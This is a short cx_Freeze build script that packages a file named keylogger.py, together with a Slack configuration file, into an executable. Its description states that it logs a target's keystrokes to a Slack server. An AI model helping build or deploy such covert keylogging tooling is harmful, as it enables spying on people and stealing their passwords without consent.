
from cx_Freeze import setup, Executable


includes = []
include_files = ["C:\Users\Vador\Documents\GitHub\keyLogger\slack.ini"]

setup(
	name = 'KeyLogger',
	version = '1.0',
	description = 'Logs key strikes of the target on a slack server',
	options = {"build_exe": {"includes": includes, "include_files": include_files}},
	executables = [Executable('keylogger.py')]
	)